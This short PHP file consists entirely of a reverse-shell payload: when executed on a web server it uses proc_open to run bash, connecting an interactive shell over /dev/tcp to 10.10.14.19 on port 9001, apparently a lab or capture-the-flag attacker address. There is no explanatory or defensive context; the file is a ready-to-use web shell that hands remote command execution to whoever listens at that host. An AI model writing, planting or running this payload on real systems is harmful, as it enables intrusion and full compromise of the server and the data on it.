<?php
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.19/9001 0>&1'";
$pipe = array(
	0 => array("pipe","r"),
	1 => array("pipe","w"),
	2 => array("pipe","w")
);
$proc = proc_open($cmd, $pipe, $pipes);
?>
